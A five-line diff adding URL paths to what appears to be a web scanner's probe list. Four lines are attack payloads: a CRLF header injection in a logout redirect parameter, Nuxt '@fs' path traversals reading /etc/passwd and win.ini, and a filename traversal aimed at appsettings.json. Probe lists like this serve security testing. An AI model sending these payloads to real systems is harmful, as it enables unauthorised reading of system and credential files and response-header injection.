@@ -1,0 +1,5 @@
+/api/users/search_authors
+/api/logout?redirect_to=%0d%0aSet-Cookie:crlfinjection=1;
+/_nuxt/@fs/etc/passwd
+/_nuxt/@fs/windows/win.ini
+/api/image/cover-upload?filename=../appsettings.json
